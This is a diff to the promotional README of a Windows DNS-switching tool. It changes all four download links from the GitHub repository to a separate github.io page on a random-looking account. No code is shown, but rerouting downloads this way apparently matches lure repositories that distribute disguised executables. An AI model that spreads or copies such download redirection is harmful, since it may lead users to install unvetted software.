@@ -1,6 +1,6 @@
 # 🚀 DNS-Server-Switcher-Free - Change Your DNS in Seconds
 
-[![Download Now](https://img.shields.io/badge/Download-DNS_Switcher_Free-blue?style=for-the-badge&logo=windows&logoColor=white&color=2ea44f)](https://github.com/dulcineaevangelistic4547/DNS-Server-Switcher-Free)
+[![Download Now](https://img.shields.io/badge/Download-DNS_Switcher_Free-blue?style=for-the-badge&logo=windows&logoColor=white&color=2ea44f)](https://dulcineaevangelistic4547.github.io)
 
 ## 👋 Welcome to DNS-Server-Switcher-Free
 
@@ -34,7 +34,7 @@ Getting started is incredibly easy. Follow these simple steps:
 
 Visit this link to download the application:
 
-[**Download DNS-Server-Switcher-Free**](https://github.com/dulcineaevangelistic4547/DNS-Server-Switcher-Free)
+[**Download DNS-Server-Switcher-Free**](https://dulcineaevangelistic4547.github.io)
 
 Click the download button on that page to get the file.
 
@@ -155,7 +155,7 @@ DNS-Server-Switcher-Free is the simplest way to take control of your internet co
 
 Stop struggling with complicated network settings. Download DNS-Server-Switcher-Free today and experience the difference that fast, reliable DNS servers can make.
 
-[**Download Now**](https://github.com/dulcineaevangelistic4547/DNS-Server-Switcher-Free)
+[**Download Now**](https://dulcineaevangelistic4547.github.io)
 
 ## 📌 Quick Reference
 
@@ -168,7 +168,7 @@ Stop struggling with complicated network settings. Download DNS-Server-Switcher-
 
 ## 🔗 Additional Resources
 
-- **Download Page**: [https://github.com/dulcineaevangelistic4547/DNS-Server-Switcher-Free](https://github.com/dulcineaevangelistic4547/DNS-Server-Switcher-Free)
+- **Download Page**: [https://dulcineaevangelistic4547.github.io](https://dulcineaevangelistic4547.github.io)
 - **Supported DNS Providers**: Google, Cloudflare, OpenDNS, Custom
 - **Compatibility**: Windows 7/8/10/11
 
